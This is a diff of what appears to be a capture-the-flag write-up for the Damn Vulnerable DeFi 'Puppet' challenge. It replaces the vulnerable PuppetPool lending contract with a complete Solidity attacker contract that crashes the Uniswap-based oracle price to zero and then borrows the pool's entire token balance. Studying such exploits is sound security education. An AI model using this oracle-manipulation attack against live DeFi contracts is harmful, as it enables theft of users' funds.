@@ -10,44 +10,43 @@ Because it calculates the price wrong we can manipulate it with a few steps
 ```
 pragma solidity ^0.6.0;
 
-import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
-import "@openzeppelin/contracts/utils/Address.sol";
-import "@openzeppelin/contracts/math/SafeMath.sol";
-import "../DamnValuableToken.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
-contract PuppetPool is ReentrancyGuard {
-    using SafeMath for uint256;
-    using Address for address payable;
+interface IPuppetPool {
+    function computeOraclePrice() external view returns (uint256);
+    function borrow(uint256 borrowAmount) external payable;
+}
 
-    address public uniswapOracle;
-    mapping(address => uint256) public deposits;
-    DamnValuableToken public token;
+interface IUniswapExchange {
+    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
+}
+
     
-    constructor (address tokenAddress, address uniswapOracleAddress) public {
-        token = DamnValuableToken(tokenAddress);
-        uniswapOracle = uniswapOracleAddress;
+contract PuppetAttacker {
+    IERC20 token;
+    IPuppetPool pool;
+    IUniswapExchange uniswap;
+
+    constructor(IERC20 _token, IPuppetPool _pool, IUniswapExchange _uniswap) public {
+        token = _token;
+        pool = _pool;
+        uniswap = _uniswap;
     }
 
-    function borrow(uint256 borrowAmount) public payable nonReentrant {
-        uint256 amountToDeposit = msg.value;
-
-        uint256 tokenPriceInWei = computeOraclePrice();
-        uint256 depositRequired = borrowAmount.mul(tokenPriceInWei) * 2;
-        
-        require(amountToDeposit >= depositRequired, "Not depositing enough collateral");
-        if (amountToDeposit > depositRequired) {
-            uint256 amountToReturn = amountToDeposit - depositRequired;
-            amountToDeposit -= amountToReturn;
-            msg.sender.sendValue(amountToReturn);
-        }        
-
-        deposits[msg.sender] += amountToDeposit;
-        require(token.transfer(msg.sender, borrowAmount), "Transfer failed");
+    function attack(uint256 amount) public {
+        require(token.balanceOf(address(this)) >= amount, "not enough tokens");
+        token.approve(address(uniswap), amount);
+        uint256 ethGained = uniswap.tokenToEthSwapInput(amount, 1, block.timestamp + 1);
+        require(pool.computeOraclePrice() == 0, "oracle price not 0");
+        pool.borrow(token.balanceOf(address(pool)));
+        require(
+            token.transfer(msg.sender, token.balanceOf(address(this))),
+            "token transfer failed"
+        );
+        msg.sender.transfer(ethGained);
     }
-
-    function computeOraclePrice() public view returns (uint256) {
-        return uniswapOracle.balance.div(token.balanceOf(uniswapOracle));
-    }
+    
+    receive() external payable {}
 }
 ```
 
